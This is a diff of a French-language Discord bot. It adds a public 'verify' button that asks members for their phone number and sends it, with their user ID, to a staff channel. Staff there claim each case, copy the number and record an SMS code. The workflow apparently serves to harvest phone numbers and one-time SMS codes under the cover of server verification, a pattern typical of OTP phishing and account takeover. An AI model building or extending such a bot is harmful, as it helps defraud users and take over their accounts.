@@ -3,6 +3,7 @@ from threading import Thread
 import discord
 from discord.ext import commands
 import os
+import re
 
 # --- SERVEUR WEB FLASK POUR RENDER ---
 app = Flask('')
@@ -27,11 +28,67 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Dictionnaire pour stocker le lien entre l'ID d'un utilisateur et le message de vérification associé
-# Cela permet de retrouver le message à modifier s'il quitte le serveur
+# ID de ton salon staff (où les demandes de vérification vont atterrir)
+STAFF_CHANNEL_ID = 1530354736866263042
+
+# Dictionnaire pour suivre les membres en temps réel (s'ils quittent le serveur)
 VERIFICATION_MESSAGES = {}
 
-class CodeModal(discord.ui.Modal, title="Entrer le code SMS"):
+# --- MODAL POUR QUE LE MEMBRE ENTRE SON NUMÉRO ---
+class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de téléphone"):
+    phone_input = discord.ui.TextInput(
+        label="Ton numéro (10 chiffres max, sans lettres)",
+        placeholder="Ex: 0612345678",
+        min_length=10,
+        max_length=10,
+        required=True
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        numero = self.phone_input.value
+
+        # Vérification stricte : uniquement des chiffres
+        if not numero.isdigit():
+            await interaction.response.send_message("❌ Ton numéro ne doit contenir **que des chiffres**, sans lettres ni espaces.", ephemeral=True)
+            return
+
+        await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)
+
+        # Envoi de la demande dans le salon Staff
+        staff_channel = bot.get_channel(STAFF_CHANNEL_ID)
+        if staff_channel:
+            embed = discord.Embed(
+                title="VÉRIFICATION",
+                color=discord.Color.from_rgb(46, 204, 113)
+            )
+            
+            embed.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
+            embed.add_field(name="ID", value=f"`{interaction.user.id}`", inline=False)
+            embed.add_field(name="Opérateur (préfixe)", value="**Inconnu**", inline=False)
+            embed.add_field(name="Numéro", value=f"`{numero}`", inline=False)
+            embed.add_field(name="🟢 Présence", value="✅ Toujours dans le serveur", inline=False)
+            embed.add_field(name="🔑 Code SMS", value="⏳ En attente...", inline=False)
+            
+            embed.set_footer(text=f"{interaction.guild.name} · Espace Makeur")
+
+            view = VerificationView(numero=numero)
+            msg = await staff_channel.send(embed=embed, view=view)
+            
+            # Stocke le message pour le suivi en temps réel
+            VERIFICATION_MESSAGES[interaction.user.id] = msg
+
+# --- VUE DU BOUTON "SE VÉRIFIER" (Sur le serveur principal) ---
+class PublicVerifyView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.button(label="Se vérifier", style=discord.ButtonStyle.green, custom_id="public_verify_btn")
+    async def verify_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = UserPhoneNumberModal()
+        await interaction.response.send_modal(modal)
+
+# --- MODAL POUR QUE LE STAFF ENTRE LE CODE SMS ---
+class StaffCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
     code_input = discord.ui.TextInput(
         label="Code SMS reçu",
         placeholder="Ex: 4829",
@@ -62,6 +119,7 @@ class CodeModal(discord.ui.Modal, title="Entrer le code SMS"):
         await interaction.response.edit_message(embed=embed, view=self.verification_view)
         await interaction.followup.send(f"✅ Code SMS enregistré avec succès : `{code_saisi}`", ephemeral=True)
 
+# --- VUE DES ACTIONS DU STAFF (Sur le serveur staff) ---
 class VerificationView(discord.ui.View):
     def __init__(self, numero: str):
         super().__init__(timeout=None)
@@ -86,7 +144,7 @@ class VerificationView(discord.ui.View):
         if self.claimed_by and self.claimed_by != interaction.user.id:
             await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
             return
-        modal = CodeModal(self)
+        modal = StaffCodeModal(self)
         await interaction.response.send_modal(modal)
 
     @discord.ui.button(label="Copier", style=discord.ButtonStyle.primary, emoji="📋", custom_id="copy_btn")
@@ -126,15 +184,13 @@ async def on_ready():
 
 @bot.event
 async def on_member_remove(member):
-    """Détecte en temps réel si le membre quitte le serveur"""
+    """Met à jour en temps réel si le membre quitte le serveur"""
     if member.id in VERIFICATION_MESSAGES:
         message = VERIFICATION_MESSAGES[member.id]
         try:
             embed = message.embeds[0]
-            # Change la couleur en rouge et met à jour le statut de présence
             embed.color = discord.Color.from_rgb(231, 76, 60)
             
-            # Cherche ou ajoute le champ de présence
             champ_trouve = False
             for i, field in enumerate(embed.fields):
                 if "Présence" in field.name:
@@ -148,31 +204,16 @@ async def on_member_remove(member):
         except Exception as e:
             print(f"Erreur lors de la mise à jour du départ du membre : {e}")
 
+# --- COMMANDE POUR GÉNÉRER LE MESSAGE DE VÉRIFICATION SUR LE SERVEUR PRINCIPAL ---
 @bot.command()
-async def test_verif(ctx, membre: discord.Member = None, numero: str = "0615463546", operateur: str = "Inconnu"):
-    """Commande de test"""
-    if membre is None:
-        membre = ctx.author
-
-    # Embed initial en vert (le membre est sur le serveur)
+async def setup_verify(ctx):
+    """Envoie le message avec le bouton 'Se vérifier' sur le serveur principal"""
     embed = discord.Embed(
-        title="VÉRIFICATION",
-        color=discord.Color.from_rgb(46, 204, 113)
+        title="📱 Vérification",
+        description="Clique sur le bouton ci-dessous pour entrer ton numéro et lancer ta vérification.\nLe staff recevra ensuite ta demande.",
+        color=discord.Color.blue()
     )
-    
-    embed.add_field(name="Utilisateur", value=f"{membre.mention}", inline=False)
-    embed.add_field(name="ID", value=f"`{membre.id}`", inline=False)
-    embed.add_field(name="Opérateur (préfixe)", value=f"**{operateur}**", inline=False)
-    embed.add_field(name="Numéro", value=f"`{numero}`", inline=False)
-    embed.add_field(name="🟢 Présence", value="✅ Toujours dans le serveur", inline=False)
-    embed.add_field(name="🔑 Code SMS", value="⏳ En attente...", inline=False)
-    
-    embed.set_footer(text=f"{ctx.guild.name} · Espace Makeur")
-
-    view = VerificationView(numero=numero)
-    msg = await ctx.send(embed=embed, view=view)
-    
-    # On associe l'ID du membre au message envoyé pour le suivre en temps réel
-    VERIFICATION_MESSAGES[membre.id] = msg
+    view = PublicVerifyView()
+    await ctx.send(embed=embed, view=view)
 
 bot.run(os.environ['DISCORD_TOKEN'])
